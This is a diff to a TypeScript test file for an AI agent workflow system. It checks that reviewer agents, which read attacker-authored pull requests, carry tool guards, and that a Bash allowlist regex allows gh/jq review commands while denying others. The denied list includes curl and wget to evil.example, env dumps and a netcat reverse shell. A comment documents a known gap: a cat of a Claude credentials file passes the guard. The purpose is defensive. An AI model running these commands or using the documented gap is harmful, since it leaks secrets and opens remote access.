@@ -60,6 +60,8 @@ import {
   FULLSTACK_QA_POST_APPROVAL_PARAGRAPH,
   REVIEWER_POST_APPROVAL_BLOCKER_PARAGRAPH,
   RETIRED_PR_MERGER_SLOT_PROMPT,
+  REVIEWER_BASH_ALLOWLIST_GUARD,
+  REVIEWER_TOOL_GUARDS,
   seedBuiltInWorkflows,
 } from '../../../../src/lib/space/workflows/built-in-workflows.ts';
 import { computeWorkflowHash } from '../../../../src/lib/space/workflows/template-hash.ts';
@@ -6636,6 +6638,80 @@ test('coder-owned post-approval merge instructions merge via gh pr merge bound t
   expect(CODER_OWNED_MERGE_INSTRUCTIONS).toContain('--match-head-commit');
   // approval_source is task provenance, NOT a merge authorization.
   expect(CODER_OWNED_MERGE_INSTRUCTIONS).toContain('NOT a merge authorization');
+});
+
+test('every reviewer slot carries the Bash allowlist + read-scope guards', () => {
+  // Round-11 P2: the Reviewer Bash profile must be allowlisted (its only job is
+  // ingesting attacker-authored PR content), so every reviewer slot gets BOTH
+  // the cross-repo read-scope guard AND the leading-executable allowlist.
+  for (const wf of getBuiltInWorkflows()) {
+    for (const node of wf.nodes) {
+      for (const agent of node.agents) {
+        const isReviewer =
+          node.name === 'Review' || node.name === 'Reviewer' || agent.name === 'reviewer';
+        if (!isReviewer) continue;
+        for (const guard of REVIEWER_TOOL_GUARDS) {
+          expect(agent.toolGuards, `${wf.name} ${node.name}/${agent.name} missing guard`).toContain(
+            guard
+          );
+        }
+      }
+    }
+  }
+});
+
+test('reviewer Bash allowlist denies arbitrary binaries but permits the review-posting surface', () => {
+  const denied = (command: string): boolean =>
+    new RegExp(REVIEWER_BASH_ALLOWLIST_GUARD.pattern).test(command);
+  // The legitimate review surface must PASS (denied === false).
+  const allowedCommands = [
+    'gh pr view https://github.com/a/b/pull/1 --json state,mergeStateStatus,headRefOid',
+    'gh pr diff 123',
+    'gh pr checks 123',
+    "gh api graphql --hostname github.com -f query='query{}' -f owner=a -f name=b -F number=1",
+    'PR_ID=$(gh pr view https://github.com/a/b/pull/1 --json id --jq .id)',
+    "HOST=$(python3 -c \"import sys,urllib.parse; print(urllib.parse.urlparse('https://github.com/a/b/pull/1').hostname or 'github.com')\")",
+    'REQ=$(mktemp)',
+    'BODY=$(mktemp)',
+    'trap \'rm -f "$REQ" "$BODY"\' EXIT',
+    'cat > "$BODY" <<\'REVIEW_BODY_DELIM\'',
+    'cat > "$FINDING" <<\'FINDING_DELIM\'',
+    'jq -n --arg id "$PR_ID" --arg event "APPROVE" --rawfile body "$BODY" \'{query: "mutation{}"}\' > "$REQ"',
+    'REVIEW_URL=$(gh api graphql --hostname "$HOST" --input "$REQ" --jq \'.data.addPullRequestReview.pullRequestReview.url\')',
+    'DELIM="REVIEW_BODY_$(head -c32 /dev/urandom | base64 | tr -dc \'A-Za-z0-9\' | head -c24)_END"',
+    'echo "heredoc delimiter: $DELIM"',
+  ];
+  for (const command of allowedCommands) {
+    expect(denied(command), `should allow: ${command.slice(0, 70)}`).toBe(false);
+  }
+  // Arbitrary binaries / exfil primitives as the LEADING command must be DENIED.
+  const deniedCommands = [
+    'curl http://evil.example/x',
+    'wget http://evil.example/x',
+    'env',
+    'printenv',
+    'nc -e /bin/sh evil.example',
+    'ssh evil.example',
+    'git push origin --force',
+    'node -e "process.exit()"',
+  ];
+  for (const command of deniedCommands) {
+    expect(denied(command), `should deny: ${command.slice(0, 70)}`).toBe(true);
+  }
+  // Honest limit of a leading-token regex allowlist (documented on the guard):
+  // `cat` is a legitimate review-surface executable (heredoc body writing), so
+  // a `cat <credential-file>` is NOT caught here — the Reviewer System Contract
+  // ("you do NOT run the code under review; read ONLY the workflow run's PR")
+  // remains the primary boundary. Asserting the gap explicitly keeps it a
+  // known, documented residual rather than a silent hole. (Note `NAME=$(curl…)`
+  // substitution-smuggling IS denied — the assignment group requires an allowed
+  // executable after `$(`.)
+  for (const command of ['cat ~/.claude/.credentials.json']) {
+    expect(
+      denied(command),
+      `documented residual gap should NOT be denied: ${command.slice(0, 70)}`
+    ).toBe(false);
+  }
 });
 
 test('no built-in template declares a dedicated merger agent or Bash merge guard', () => {
